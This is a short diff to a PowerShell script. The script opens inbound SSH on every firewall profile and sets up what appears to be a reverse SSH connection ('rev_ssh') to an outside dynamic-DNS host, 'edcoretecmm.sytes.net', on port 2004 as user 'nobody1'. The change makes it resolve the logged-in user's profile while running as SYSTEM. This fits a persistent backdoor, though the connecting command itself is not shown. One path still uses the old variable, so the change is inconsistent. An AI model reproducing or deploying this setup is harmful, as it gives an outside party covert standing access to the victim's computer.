@@ -27,16 +27,19 @@ if (!(Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP-All" -ErrorAction Silentl
         -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22 -Profile Any
 }
 
-# Prepare SSH key path
-$username = $env:USERNAME
-$sshDir = "$env:USERPROFILE\.ssh"
-$keyFile = "$sshDir\$($env:USERNAME)_ed25519"
+# Get actual logged-in username and profile path (works even if running as SYSTEM)
+$username = (Get-WmiObject Win32_ComputerSystem | Select-Object -ExpandProperty UserName)
+$username = $username.Split('\')[-1]
+$userProfile = "C:\Users\$username"
+$sshDir = "$userProfile\.ssh"
+$keyFile = "$sshDir\${username}_ed25519"
 $pubKeyFile = "$keyFile.pub"
 $user = "nobody1"
 $remote_host = "edcoretecmm.sytes.net"
 $receivedPort = 2004
-$logFile = "$env:USERPROFILE\Other\rev_ssh.log"
-$batFilePath = "$env:USERPROFILE\Other\rev_ssh.bat"
+$logFile = "$userProfile\Other\rev_ssh.log"
+$batFilePath = "$userProfile\Other\rev_ssh.bat"
+
 
 # Create Other directory if not exists
 $otherDir = "$env:USERPROFILE\Other"
